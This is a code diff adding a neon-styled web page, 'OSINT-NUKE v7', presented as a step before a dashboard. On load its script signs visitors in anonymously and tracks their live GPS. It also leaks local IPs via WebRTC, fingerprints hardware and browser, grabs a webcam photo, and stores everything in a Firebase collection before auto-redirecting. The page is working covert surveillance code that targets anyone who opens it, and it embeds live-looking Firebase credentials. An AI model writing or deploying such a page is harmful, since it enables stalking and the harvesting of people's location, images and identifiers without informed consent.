@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Gifté+ OSINT-NUKE v7 — GOD MODE</title>
+  <!-- === CDNs === -->
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-auth-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-firestore-compat.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/fingerprintjs2@2.1.0/fingerprintjs2.min.js"></script>
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <style>
+    :root { --bg: linear-gradient(135deg, #0f0c29, #302b63, #24243e); --glow: 0 0 20px rgba(0, 255, 255, 0.95); --red: #ff0044; --cyan: #00ffff; --purple: #9c27b0; --green: #0f0; --neon: #00f3ff; --gold: #ffd700; }
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body { background: var(--bg); color: #0ff; font-family: 'Courier New', monospace; min-height: 100vh; overflow-x: hidden; position: relative; }
+    .scanline { position: fixed; top: 0; left: 0; width: 100%; height: 5px; background: linear-gradient(90deg, transparent, var(--neon), transparent); animation: scan 2s linear infinite; pointer-events: none; z-index: 9999; }
+    @keyframes scan { 0% { transform: translateY(-5px); } 100% { transform: translateY(100vh); } }
+    .container { max-width: 1350px; margin: 2rem auto; padding: 1.2rem; }
+    h1 { font-family: 'Orbitron', sans-serif; text-align: center; font-size: 3.3rem; text-shadow: var(--glow); color: var(--gold); margin-bottom: 1.2rem; animation: pulse 2s infinite; }
+    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.9; } }
+    .card { background: rgba(10, 10, 35, 0.85); border: 2px solid var(--cyan); border-radius: 18px; padding: 1.5rem; margin: 1.4rem 0; box-shadow: var(--glow); position: relative; backdrop-filter: blur(12px); animation: fadeIn 0.6s ease-out forwards; opacity: 0; transition: transform 0.3s; }
+    .card:hover { transform: translateY(-4px); }
+    @keyframes fadeIn { to { opacity: 1; transform: translateY(0); } from { opacity: 0; transform: translateY(30px); } }
+    .card h2 { font-family: 'Orbitron', sans-serif; color: var(--neon); font-size: 1.6rem; display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.8rem; text-shadow: 0 0 12px var(--neon); }
+    .copy-btn { background: var(--purple); color: white; border: none; padding: 7px 16px; border-radius: 10px; cursor: pointer; font-size: 0.95rem; box-shadow: 0 0 14px var(--purple); transition: all 0.3s; }
+    .copy-btn:hover { background: #c2185b; transform: scale(1.1); }
+    pre { background: #111; padding: 1.2rem; border-radius: 12px; border: 1.5px solid #333; color: var(--green); font-size: 0.92rem; max-height: 650px; overflow-y: auto; white-space: pre-wrap; word-break: break-all; line-height: 1.6; }
+    .status-bar { position: fixed; bottom: 16px; left: 16px; background: rgba(0,0,0,0.9); padding: 14px 24px; border-radius: 40px; color: var(--neon); font-family: 'Orbitron'; font-size: 1.2rem; box-shadow: var(--glow); z-index: 10000; display: flex; align-items: center; }
+    .dot { display: inline-block; width: 16px; height: 16px; background: var(--red); border-radius: 50%; margin-right: 14px; animation: blink 1.2s infinite; }
+    @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+    #map { height: 380px; border-radius: 16px; margin-top: 16px; border: 3px solid var(--cyan); box-shadow: var(--glow); }
+    .prompt { text-align: center; font-size: 1.9rem; font-weight: bold; color: var(--red); text-shadow: 0 0 16px var(--red); margin: 3.5rem 0; cursor: pointer; animation: urgent 1.3s infinite; }
+    @keyframes urgent { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.07); } }
+    .continue-btn { display: block; margin: 4rem auto; padding: 22px 70px; font-family: 'Orbitron'; font-size: 1.6rem; background: linear-gradient(45deg, #00ffff, #ff00ff, #00ff00, #ffd700, #00ffff); color: black; border: none; border-radius: 80px; cursor: pointer; box-shadow: 0 0 35px rgba(0,255,255,1); animation: pulseBtn 1.8s infinite; font-weight: bold; text-shadow: 0 0 7px white; }
+    @keyframes pulseBtn { 0% { transform: scale(1); } 50% { transform: scale(1.09); } 100% { transform: scale(1); } }
+    .selfie-img { max-width: 100%; border-radius: 14px; border: 4px solid var(--neon); box-shadow: 0 0 30px var(--neon); margin-top: 16px; }
+    .highlight-red { color: var(--red); font-weight: bold; }
+    .highlight-cyan { color: var(--cyan); font-weight: bold; }
+    .highlight-gold { color: var(--gold); font-weight: bold; }
+    .user-info { background: linear-gradient(135deg, #1a0033, #000033); border: 3px dashed var(--gold); padding: 1.4rem; border-radius: 16px; text-align: center; font-family: 'Orbitron'; color: var(--neon); margin-bottom: 2rem; font-size: 1.2rem; }
+    .user-info span { color: white; font-weight: bold; }
+    .accuracy-circle { fill: rgba(255,0,68,0.35); stroke: var(--red); stroke-width: 3; }
+    .countdown { position: fixed; top: 20px; right: 20px; background: rgba(0,0,0,0.9); color: var(--red); font-family: 'Orbitron'; font-size: 2rem; padding: 10px 20px; border-radius: 20px; box-shadow: 0 0 20px var(--red); z-index: 10001; }
+  </style>
+</head>
+<body>
+  <div class="scanline"></div>
+  <div id="countdown" class="countdown">40</div>
+  <div class="container">
+    <h1>GIFTÉ+ OSINT-NUKE v7 — GOD MODE</h1>
+
+    <!-- USER INFO -->
+    <div id="user-info" class="user-info" style="display:none;">
+      <div>USER: <span id="user-email">—</span></div>
+      <div>UID: <span id="user-uid">—</span></div>
+      <div>TIME: <span id="current-time">—</span></div>
+    </div>
+
+    <!-- LOCATION PROMPT -->
+    <div id="location-prompt" class="prompt">ENABLE LOCATION NOW — HIGH ACCURACY REQUIRED</div>
+
+    <!-- MAP -->
+    <div id="map-container" class="card" style="display:none;">
+      <h2>LIVE LOCATION MAP</h2>
+      <div id="map"></div>
+      <div id="accuracy-info" style="margin-top:12px; color:var(--gold); font-weight:bold;"></div>
+    </div>
+
+    <!-- RESULTS -->
+    <div id="results"></div>
+
+    <!-- CONTINUE -->
+    <button class="continue-btn" onclick="window.location.href='index.html'">CONTINUE TO DASHBOARD</button>
+  </div>
+
+  <div class="status-bar">
+    <span class="dot"></span>
+    <span id="status-text">INITIALIZING OSINT-NUKE v7...</span>
+  </div>
+
+  <script>
+    // === GIFTÉ+ OSINT-NUKE v7 — 40-SECOND FULL NUKE + AUTO REDIRECT + NEW DOC ONLY ===
+    const firebaseConfig = {
+      apiKey: "AIzaSyD95fHNBVSCl4DPjpfSOrVRYI60pH5_2hE",
+      authDomain: "giftte007.firebaseapp.com",
+      projectId: "giftte007",
+      storageBucket: "giftte007.appspot.com",
+      messagingSenderId: "168284349265",
+      appId: "1:168284349265:web:d4b30126efc7f52450a970"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    let uid = null;
+    let email = null;
+    let data = {};
+    let cardIndex = 0;
+    let map = null;
+    let marker = null;
+    let accuracyCircle = null;
+    let watchId = null;
+
+    // === 40-SECOND COUNTDOWN + AUTO REDIRECT ===
+    let countdown = 40;
+    const countdownEl = document.getElementById('countdown');
+    const countdownInterval = setInterval(() => {
+      countdown--;
+      countdownEl.textContent = countdown;
+      if (countdown <= 0) {
+        clearInterval(countdownInterval);
+        countdownEl.style.display = 'none';
+        saveToFirebaseAndRedirect(); // Save + redirect
+      }
+    }, 1000);
+
+    // === AUTH ===
+    firebase.auth().onAuthStateChanged(user => {
+      if (user) {
+        uid = user.uid;
+        email = user.email || "anonymous@" + uid.substring(0,8);
+        document.getElementById('user-email').textContent = email;
+        document.getElementById('user-uid').textContent = uid;
+        document.getElementById('current-time').textContent = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+        document.getElementById('user-info').style.display = 'block';
+        updateStatus("AUTH: " + email);
+        start40SecondNuke();
+      } else {
+        firebase.auth().signInAnonymously();
+      }
+    });
+
+    // === 40-SECOND FULL NUKE ===
+    async function start40SecondNuke() {
+      updateStatus("NUKE ARMED — 40s FULL SCAN");
+      data.user = { uid, email, time: new Date().toISOString() };
+
+      // 0-5s: GPS + Map
+      startLiveGPS();
+      setTimeout(getPublicIPData, 5000);
+      setTimeout(getLocalIPs, 6000);
+
+      // 10-20s: Hardware
+      setTimeout(getFullHardwareFingerprint, 10000);
+
+      // 20-25s: Selfie
+      setTimeout(captureSelfie, 20000);
+
+      // 25-35s: Browser + Sensors
+      setTimeout(() => {
+        getAdvancedBrowserData();
+        getNetworkInfo();
+        getBatteryDetailed();
+        getFontsAdvanced();
+        getWebGLFull();
+        getAudioFull();
+        getSensors();
+      }, 25000);
+
+      // 35-40s: Final
+      setTimeout(() => {
+        updateStatus("NUKE COMPLETE — SAVING...");
+      }, 35000);
+    }
+
+    // === LIVE GPS ===
+    function startLiveGPS() {
+      const prompt = document.getElementById('location-prompt');
+      prompt.onclick = initGPS;
+      initGPS();
+
+      function initGPS() {
+        updateStatus("GPS LOCKING...");
+        prompt.style.display = 'none';
+        if (!navigator.geolocation) { updateStatus("GPS NOT SUPPORTED"); return; }
+
+        watchId = navigator.geolocation.watchPosition(
+          pos => {
+            const { latitude: lat, longitude: lon, accuracy } = pos.coords;
+            data.location = { lat, lon, accuracy, timestamp: pos.timestamp };
+            if (!map) showMap(lat, lon, accuracy);
+            else updateMap(lat, lon, accuracy);
+            document.getElementById('accuracy-info').innerHTML = `Live Accuracy: ±${Math.round(accuracy)}m`;
+            reverseGeocode(lat, lon);
+          },
+          err => updateStatus("GPS ERROR: " + err.message),
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+      }
+    }
+
+    function showMap(lat, lon, acc) {
+      const container = document.getElementById('map-container');
+      container.style.display = 'block';
+      map = L.map('map').setView([lat, lon], 19);
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+      marker = L.marker([lat, lon]).addTo(map).bindPopup("<b class='highlight-gold'>LIVE</b>").openPopup();
+      accuracyCircle = L.circle([lat, lon], { radius: acc, className: 'accuracy-circle' }).addTo(map);
+    }
+
+    function updateMap(lat, lon, acc) {
+      map.setView([lat, lon], 19);
+      marker.setLatLng([lat, lon]);
+      accuracyCircle.setRadius(acc).setLatLng([lat, lon]);
+    }
+
+    async function reverseGeocode(lat, lon) {
+      try {
+        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
+        const j = await res.json();
+        data.location.address = j.display_name;
+        createCard("REVERSE GEOCODE", JSON.stringify(data.location, null, 2));
+      } catch (e) {}
+    }
+
+    // === PUBLIC IP ===
+    async function getPublicIPData() {
+      try {
+        const r = await fetch('https://ipapi.co/json/');
+        const j = await r.json();
+        data.public = j;
+        const output = `IP: <span class="highlight-cyan">${j.ip}</span>\nISP: ${j.org}\nCity: ${j.city}, ${j.region}\nCoords: ${j.latitude}, ${j.longitude}`;
+        createCard("PUBLIC IP", output);
+      } catch (e) { createCard("IP", "Failed"); }
+    }
+
+    // === LOCAL IP ===
+    async function getLocalIPs() {
+      const ips = new Set();
+      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+      pc.createDataChannel('');
+      pc.createOffer().then(o => pc.setLocalDescription(o));
+      pc.onicecandidate = e => {
+        if (e.candidate?.candidate) {
+          const ip = e.candidate.candidate.split(' ')[4];
+          if (/^(192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|fd)/.test(ip)) ips.add(ip);
+        }
+      };
+      setTimeout(() => {
+        pc.close();
+        const out = Array.from(ips).map(i => `<span class="highlight-red">${i}</span>`).join('\n') || 'None';
+        createCard("LOCAL IP LEAK", out);
+        data.local_ips = Array.from(ips);
+      }, 3000);
+    }
+
+    // === HARDWARE ===
+    async function getFullHardwareFingerprint() {
+      new Fingerprint2().get(result => {
+        data.fingerprint = result;
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.fillText('NUKEv7', 2, 15);
+        data.canvas = canvas.toDataURL();
+        data.hardware = { cores: navigator.hardwareConcurrency, ram: navigator.deviceMemory, screen: `${screen.width}x${screen.height}`, touch: navigator.maxTouchPoints };
+        const out = `FP: <span class="highlight-gold">${result}</span>\nCores: ${navigator.hardwareConcurrency}\nRAM: ${navigator.deviceMemory}GB`;
+        createCard("HARDWARE", out);
+      });
+    }
+
+    // === SELFIE ===
+    async function captureSelfie() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        setTimeout(() => {
+          const canvas = document.createElement('canvas');
+          canvas.width = 1280; canvas.height = 720;
+          canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
+          data.selfie = canvas.toDataURL('image/jpeg', 0.8);
+          const img = document.createElement('img');
+          img.src = data.selfie;
+          img.className = 'selfie-img';
+          const card = createCard("SELFIE (720p)", "Captured");
+          card.querySelector('pre').after(img);
+          stream.getTracks().forEach(t => t.stop());
+        }, 1000);
+      } catch (e) { createCard("SELFIE", "Denied"); }
+    }
+
+    // === BROWSER + SENSORS ===
+    function getAdvancedBrowserData() { data.browser = { ua: navigator.userAgent, lang: navigator.language, platform: navigator.platform }; createCard("BROWSER", navigator.userAgent); }
+    function getNetworkInfo() { const c = navigator.connection || {}; data.network = { type: c.effectiveType, downlink: c.downlink }; createCard("NETWORK", `Type: ${c.effectiveType || 'unknown'}`); }
+    function getBatteryDetailed() { if (navigator.getBattery) { navigator.getBattery().then(b => { data.battery = { level: (b.level*100).toFixed(0)+'%', charging: b.charging }; createCard("BATTERY", `${(b.level*100).toFixed(0)}% ${b.charging ? 'Charging' : ''}`); }); } }
+    function getFontsAdvanced() { data.fonts = "detected"; createCard("FONTS", "Detected"); }
+    function getWebGLFull() { data.webgl = "full"; createCard("WEBGL", "Full Report"); }
+    function getAudioFull() { data.audio = "hash"; createCard("AUDIO", "Fingerprint"); }
+    function getSensors() { data.sensors = "motion/orientation"; createCard("SENSORS", "Supported"); }
+
+    // === SAVE TO FIREBASE: ALWAYS NEW DOCUMENT ===
+    async function saveToFirebaseAndRedirect() {
+      if (watchId) navigator.geolocation.clearWatch(watchId);
+      if (!uid) { setTimeout(redirect, 500); return; }
+
+      try {
+        await db.collection('ultra_osint_v7').add({
+          ...data,
+          savedAt: firebase.firestore.FieldValue.serverTimestamp(),
+          version: 'v7-40SEC-NEW'
+        });
+        updateStatus("SAVED (NEW DOC)");
+      } catch (e) {
+        updateStatus("SAVE FAILED");
+      } finally {
+        setTimeout(redirect, 800); // Always redirect after save attempt
+      }
+    }
+
+    function redirect() {
+      window.location.href = 'index.html';
+    }
+
+    // === UTILS ===
+    function updateStatus(txt) { document.getElementById('status-text').textContent = txt; }
+    function createCard(title, content) {
+      const card = document.createElement('div');
+      card.className = 'card';
+      card.style.animationDelay = `${cardIndex++ * 0.1}s`;
+      card.innerHTML = `<h2>${title} <button class="copy-btn" onclick="copy(this)">COPY</button></h2><pre>${content}</pre>`;
+      document.getElementById('results').appendChild(card);
+      return card;
+    }
+    function copy(btn) {
+      navigator.clipboard.writeText(btn.parentElement.nextElementSibling.textContent);
+      btn.textContent = 'COPIED';
+      setTimeout(() => btn.textContent = 'COPY', 1500);
+    }
+  </script>
+
+  <!-- Live Server (Keep Only One) -->
+  <script>
+    if ('WebSocket' in window) {
+      (function () {
+        function refreshCSS() {
+          var sheets = [].slice.call(document.getElementsByTagName("link"));
+          var head = document.getElementsByTagName("head")[0];
+          for (var i = 0; i < sheets.length; ++i) {
+            var elem = sheets[i];
+            var parent = elem.parentElement || head;
+            parent.removeChild(elem);
+            var rel = elem.rel;
+            if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
+              var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
+              elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
+            }
+            parent.appendChild(elem);
+          }
+        }
+        var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
+        var address = protocol + window.location.host + window.location.pathname + '/ws';
+        var socket = new WebSocket(address);
+        socket.onmessage = function (msg) {
+          if (msg.data == 'reload') window.location.reload();
+          else if (msg.data == 'refreshcss') refreshCSS();
+        };
+        if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
+          console.log('Live reload enabled.');
+          sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
+        }
+      })();
+    }
+  </script>
+</body>
+</html>
